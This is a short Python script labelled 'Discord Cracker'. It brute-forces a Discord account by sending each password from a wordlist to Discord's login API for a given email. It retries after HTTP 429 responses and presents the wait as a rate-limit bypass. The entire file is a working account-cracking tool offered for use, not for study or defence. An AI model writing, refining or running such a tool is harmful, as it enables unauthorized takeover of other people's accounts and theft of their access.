import requests
import time
import sys
import os

def main():
    print("YT: Discord Cracker")
    print("--------------------")

    email = input("Enter your email: ")

    print("1: Normal login")
    print("2: Auto login")
    select = input()

    if select == "2":
        password_file_path = input("Enter the path to the password file: ")

        if not os.path.exists(password_file_path):
            print("Password file not found. Exiting...")
            return

        with open(password_file_path, 'r') as file:
            passwords = file.read().splitlines()

        print("Trying passwords...\n")

        for password in passwords:
            print(f"Testing password: {password}... ", end="")
            login_result = test_login(email, password)

            if login_result:
                print("\n\n\nCracked successful!")
                print(f"email: {email}")
                print(f"password: {password}")
                break
            else:
                print("Login failed.")

        print("\nCracked complete.")
    else:
        password = input("Enter your password: ")

        while True:
            print(f"Trying password: {password}... ", end="")
            login_result = test_login(email, password)

            if login_result:
                print("Login successful!")
                break
            else:
                print("Login failed.")

def test_login(email, password):
    try:
        request_url = "https://discord.com/api/v9/auth/login"
        headers = {"Host": "discord.com"}
        data = {"login": email, "password": password}
        response = requests.post(request_url, headers=headers, json=data)

        if response.status_code == 200:
            return True
        elif response.status_code == 429:
            print("YT: Too Many Requests Bypass Statuscode 429 successful!")
            time.sleep(5)  # Delay to bypass rate limiting
            return test_login(email, password)
        else:
            print(response.status_code)
            return False
    except Exception as ex:
        print(f"An error occurred: {str(ex)}")
        return False

if __name__ == "__main__":
    main()
